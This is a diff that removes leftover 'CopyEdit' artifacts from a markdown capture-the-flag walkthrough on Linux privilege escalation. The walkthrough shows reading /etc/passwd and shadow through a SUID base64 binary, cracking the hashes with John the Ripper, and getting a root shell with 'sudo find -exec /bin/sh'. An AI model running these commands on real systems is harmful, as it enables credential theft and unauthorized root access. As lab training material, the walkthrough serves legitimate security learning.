@@ -5,8 +5,7 @@
 ## 🛰️ **Reconnaissance**
 
 ```bash
-bash
-CopyEdit
+
 # List users with home directories
 cat /etc/passwd | grep home
 
@@ -29,8 +28,7 @@ sudo -l
 ## 🔍 **Finding SUID Binaries**
 
 ```bash
-bash
-CopyEdit
+
 # Find all files with SUID bit set
 find / -type f -perm -04000 -ls 2>/dev/null
 
@@ -49,8 +47,7 @@ find / -type f -perm -u=s -ls 2>/dev/null
 Since `base64` has SUID permissions, we can **read protected files**:
 
 ```bash
-bash
-CopyEdit
+
 # Read /etc/passwd
 LFILE=/etc/passwd
 base64 "$LFILE" | base64 --decode
@@ -70,8 +67,7 @@ base64 "$LFILE" | base64 --decode
 First, create a password hash file:
 
 ```bash
-bash
-CopyEdit
+
 unshadow passwd.txt shadow.txt > passwords.txt
 
 ```
@@ -79,8 +75,7 @@ unshadow passwd.txt shadow.txt > passwords.txt
 Then crack it using John and a wordlist:
 
 ```bash
-bash
-CopyEdit
+
 john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 
 ```
@@ -100,8 +95,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 ## 🔐 **Switch User to Missy**
 
 ```bash
-bash
-CopyEdit
+
 su missy
 cd /home/missy/Documents
 cat flag1.txt
@@ -118,8 +112,7 @@ cat flag1.txt
 Check sudo permissions:
 
 ```bash
-bash
-CopyEdit
+
 sudo -l
 
 ```
@@ -127,8 +120,7 @@ sudo -l
 **Exploit via `find` command:**
 
 ```bash
-bash
-CopyEdit
+
 sudo find . -exec /bin/sh \; -quit
 
 ```
@@ -136,8 +128,7 @@ sudo find . -exec /bin/sh \; -quit
 Move to root directory and capture second flag:
 
 ```bash
-bash
-CopyEdit
+
 cd /home/rootflag
 cat flag2.txt
 
